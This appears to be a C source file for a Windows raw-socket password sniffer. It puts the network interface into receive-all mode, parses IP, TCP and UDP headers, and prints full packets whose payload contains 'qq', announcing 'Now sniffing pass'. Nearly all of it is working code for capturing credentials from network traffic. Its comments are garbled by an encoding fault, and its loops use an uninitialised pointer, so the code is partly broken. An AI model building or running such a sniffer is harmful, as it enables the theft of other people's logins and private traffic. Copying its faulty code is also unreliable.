#include<Winsock2.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#pragma comment(lib,"ws2_32.lib")//������ӿ�

#define MAX_PACK_LEN 4096//���ܵ����ip����
#define MAX_ADDR_LEN 16//���ʮ���Ƶ�ַ����󳤶�
#define MAX_HOSTNAME_LAN 255//�������������
#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)//i/o��������

typedef struct _iphdr  //IP�ײ�
{
	unsigned char h_lenver; //4λIP�汾�� + 4λ�ײ�����
	unsigned char tos; //8λ��������TOS
	unsigned short total_len; //16λ�ܳ��� 
    unsigned short ident; //16λ��ʶ
	unsigned short frag_and_flags; //3λ��־λ��13λƬƫ��
	unsigned char ttl; //8λ����ʱ��
    unsigned char proto;//8λЭ��
	unsigned short checksum; //16λIP�ײ�У���
	unsigned int sourceIP; //32λԴIP��ַ
	unsigned int destIP; //32λĿ��IP��ַ
}IP_HEADER;

typedef struct _tcpphdr  //TCP�ײ�
{
	unsigned short sourcePORT; //16λԴ�˿ں�
	unsigned short sdestPORT; //16λĿ�Ķ˿ں�
	unsigned int sequence; //32λ���к�
    unsigned int confirm; //32λȷ�Ϻ�
	unsigned char th_lenres; //4λ�ײ����� + 4λ������
    unsigned char th_flag;  //2λ������ + 6λ��־λ
	unsigned short windowsize; //16λ���ڴ�С
	unsigned short checksum; //16λIP�ײ�У���
	unsigned short urgent_p; //32λ����ָ��
}TCP_HEADER;

typedef struct _udpphdr  //UDP�ײ�
{
	unsigned short sourcePORT;//16λԴ�˿ں�
	unsigned short sdestPORT;//16λĿ�Ķ˿ں�
	unsigned short h_len;//16λ����
	unsigned short checksum;//16λIP�ײ�У���
}UDP_HEADER;



//ip�������
int DecodeIPPack(char *buf,int iBufSize){
	
	//��ʾIPͷ��
	
	//������ͷָ��
	IP_HEADER *pIpheader=(IP_HEADER *)buf;
	//��ʾip���汾��
	int iIphVer = ((pIpheader->h_lenver)>>4 &0xf);
	//��ʾip��ͷ����
	int iIphLen = sizeof(unsigned long)*(pIpheader->h_lenver &0xf);
	//��ʾ��������
	int iIphTos = pIpheader->tos;
	//��ʾ�ܳ���
	int iIphToatl_len = ntohs(pIpheader->total_len);
	//��ʾ��ʶ
	int iIphIdent = ntohs(pIpheader->ident);
	//��ʾ��־
	int iIphFrag = ((pIpheader->frag_and_flags)>>13 &0x7);
	//��ʾƬƫ��
	int iIphFlags = ((pIpheader->frag_and_flags &0x1fff));
	//��ʾ����ʱ��
	int iTTL = pIpheader->ttl;
	//��ʾ�ϲ�Э���ʶ
	int iIphProto = pIpheader->proto;
	//��ʾͷ�������
	int iIphChecksum = ntohs(pIpheader->checksum);
	//��ʾԴip,Ŀ��ip
	char szSourceIP[MAX_ADDR_LEN],szDestIP[MAX_ADDR_LEN];
	SOCKADDR_IN saSource,saDest;
	//��ȡԴip��ַ
	saSource.sin_addr.s_addr=pIpheader->sourceIP;
	//�õ����ʮ�����ַ�����ʽ��ip��ַ
	strncpy(szSourceIP,inet_ntoa(saSource.sin_addr),MAX_ADDR_LEN);
	//��ȡĿ��IP��ַ
	saDest.sin_addr.s_addr=pIpheader->destIP;
	//�õ����ʮ�����ַ�����ʽ��IP��ַ
	strncpy(szDestIP,inet_ntoa(saDest.sin_addr),MAX_ADDR_LEN);
	
	
	
	char *SearchPass,*start,*end;
	
	if(iIphProto==6){
		
		//������ͷָ��
		TCP_HEADER *pTcpheader = (TCP_HEADER *)(buf + iIphLen);
		//��ʾ�ײ�����
		int iTcphLen = sizeof(unsigned long)*((pTcpheader->th_lenres)>>4 &0xf);
		SearchPass = buf +iIphLen + iTcphLen;
	}else if(iIphProto==17){
		SearchPass = buf +iIphLen + 8;
	}
		
		
	
	
	
	
	
	
	//---------���ץ���û�������������------------
	start = strstr(SearchPass,"qq");//�����û���

	

	if(start!=NULL){
		printf("�յ����������Ҫ����Ϣ�İ���(����pass��user)\n");
		

		//��ӡipͷ����Ϣ
		printf("��ʾipͷ����Ϣ:\n");
		printf("ip��ͷ�汾��: %d\n", iIphVer);
		printf("ip��ͷ����: %d�ֽ�\n", iIphLen);
		printf("ip����������: %d\n", iIphTos);
		printf("ip���ܳ���: %d\n", iIphToatl_len);
		printf("ip����ʶ: %d\n", iIphIdent);
		printf("ip����־: %d\n", iIphFrag);
		printf("ip��Ƭƫ��: %d\n", iIphFlags);
		printf("ip������ʱ��: %d\n", iTTL);
		printf("ip���ϲ�Э���ʶ: %d\n", iIphProto);
		printf("ip��ͷ�������: %d\n", iIphChecksum);
		printf("Դ��ַ: %s\n",szSourceIP);
		printf("Ŀ�ĵ�ַ: %s\n",szDestIP);
		printf("\n");
		
		if(iIphProto==6){
			//��ʾtcpͷ��
	
			//������ͷָ��
			TCP_HEADER *pTcpheader = (TCP_HEADER *)(buf + iIphLen);
			
			//��ʾ�˿�
			SOCKADDR_IN saSource,saDest;
			//��ʾԴ�˿�
			saSource.sin_port = pTcpheader->sourcePORT;
			int iTcphSourcePORT = ntohs(saSource.sin_port);
			//��ʾĿ�Ķ˿�
			saDest.sin_port = pTcpheader->sdestPORT;
			int iTcphSdentPORT = ntohs(saDest.sin_port);
			//��ʾ���к�
			unsigned int iTcphSequence = ntohl(pTcpheader->sequence);
			//��ʾȷ�Ϻ�
			unsigned int iTcphConfirm = ntohl(pTcpheader->confirm);
			//��ʾ�ײ�����
			int iTcphLen = sizeof(unsigned long)*((pTcpheader->th_lenres)>>4 &0xf);
			//�����־Ͳ���ӡ��
			//��ʾ��λ��־λ
			int iTcphFlag = ((pTcpheader->th_flag) &0x3f);
			//��ʾ���ڴ�С
			int iTcphWindowsize = ntohs(pTcpheader->windowsize);
			//��ʾ�����
			int iTcphChecksum = ntohs(pTcpheader->checksum);
			//��ʾ����ָ��
			unsigned int iTcphUrgent_p = ntohl(pTcpheader->urgent_p);
			printf("����һ��TCP��\n");
			printf("��ʾtcpͷ����Ϣ:\n");
			printf("Դ�˿ں�: %d\n",iTcphSourcePORT);
			printf("Ŀ�Ķ˿�: %d\n",iTcphSdentPORT);
			printf("���к�: %u\n", iTcphSequence);
			printf("ȷ�Ϻ�: %u\n", iTcphConfirm);
			printf("�ײ�����: %d\n", iTcphLen);
			printf("��λ��־λ: %d\n", iTcphFlag);
			printf("���ڴ�С: %d\n", iTcphWindowsize);
			printf("�����: %d\n", iTcphChecksum);
			printf("����ָ��: %u\n", iTcphUrgent_p);
			
			printf("��������ݲ��ֳ���: %d\n", iIphToatl_len-iTcphLen-iIphLen);
			
			int count = 1;
			for(char* i= start;i!=end;++i,++count){
				printf("%c",*i);
			}
			printf("\n");
		
			for(char* j = end; count<iIphToatl_len-iTcphLen-iIphLen; ++j,++count){
				printf("%c",*j);
			}
			printf("\n");
		}else if(iIphProto==17){
			//��ʾudpͷ��
	
			//������ͷָ��
			UDP_HEADER *pUdpheader = (UDP_HEADER *)(buf + iIphLen);
			
			//��ʾ�˿�
			SOCKADDR_IN saSource,saDest;
			//��ʾԴ�˿�
			saSource.sin_port = pUdpheader->sourcePORT;
			int iUdphSourcePORT = ntohs(saSource.sin_port);
			//��ʾĿ�Ķ˿�
			saDest.sin_port = pUdpheader->sdestPORT;
			int iUdphSdentPORT = ntohs(saDest.sin_port);
			
			//��ʾ�ܳ���
			int iUdphLen = ntohs(pUdpheader->h_len);
			//��ʾ�ײ������
			int iUdphChecksum = ntohs(pUdpheader->checksum);
			printf("����һ��Udp��\n");
			printf("��ʾudpͷ����Ϣ\n");
			printf("Դ�˿ں�: %d\n",iUdphSourcePORT);
			printf("Ŀ�Ķ˿�: %d\n",iUdphSdentPORT);
			printf("�ܳ���: %d\n", iUdphLen);
			printf("�ײ������: %d\n", iUdphChecksum);
			
			printf("��������ݲ��ֳ���: %d\n", iUdphLen-8);
			
			int count = 1;
			for(char* i= start;i!=end;++i,++count){
				printf("%c",*i);
			}
			printf("\n");
		
			for(char* j = end; count<iUdphLen-8; ++j,++count){
				printf("%c",*j);
			}
			printf("\n");
		}
	}
	//------------------------
	return 0;
}

SOCKET SockRaw;
//sock���������
void CheckSockError(int iErrorCode, char *pErrorMsg){
	if(iErrorCode==SOCKET_ERROR){
		printf("%s Error:%d\n", pErrorMsg, GetLastError());
		closesocket(SockRaw);
		exit(0);
	}
}



void main(int argc,char ** argv){
	int iErrorCode;
	char RecvBuf[MAX_PACK_LEN]={0};
	WSADATA wsaData;
	char name[MAX_HOSTNAME_LAN];
	struct hostent * pHostent;
	SOCKADDR_IN sa;
	DWORD dwBufferLen [10];
	DWORD dwBufferInLen=1;
	DWORD dwBytesReturned=0;

	printf("---- Now sniffing pass,CTRL+C to exit...\n\n");
	//
	iErrorCode=WSAStartup(0x0202,&wsaData);
	CheckSockError(iErrorCode,"WSAStartup");
	SockRaw=socket(AF_INET,SOCK_RAW,IPPROTO_IP);
	CheckSockError(SockRaw,"socket");

	iErrorCode=gethostname(name,MAX_HOSTNAME_LAN);
	CheckSockError(iErrorCode,"gethostname");
	pHostent=(struct hostent *)malloc(sizeof(struct hostent));
	pHostent=gethostbyname(name);
	sa.sin_family=AF_INET;
	sa.sin_port=htons(6000);
	memcpy(&sa.sin_addr.S_un.S_addr,pHostent->h_addr_list[0],pHostent->h_length);
	//���׽���
	iErrorCode=bind(SockRaw,(PSOCKADDR)&sa,sizeof(sa));
	CheckSockError(iErrorCode,"bind");
	//�������Ľ���ģʽ����Ϊ����ģʽ������SOCK_RAWΪSIO_RCVALL��,�Ա�������е�ip1��
	iErrorCode=WSAIoctl(SockRaw,SIO_RCVALL,&dwBufferInLen,sizeof(dwBufferInLen),
		&dwBufferLen,sizeof(dwBufferLen),&dwBytesReturned,NULL,NULL);
	CheckSockError(iErrorCode,"Ioctl");

	while(1)
	{
		memset(RecvBuf,0,sizeof(RecvBuf));
		iErrorCode=recv(SockRaw,RecvBuf,sizeof(RecvBuf),0);
		CheckSockError(iErrorCode,"recv");
		iErrorCode=DecodeIPPack(RecvBuf,iErrorCode);//���յ���ip�����н��
		CheckSockError(iErrorCode,"Decode");
	}
}



























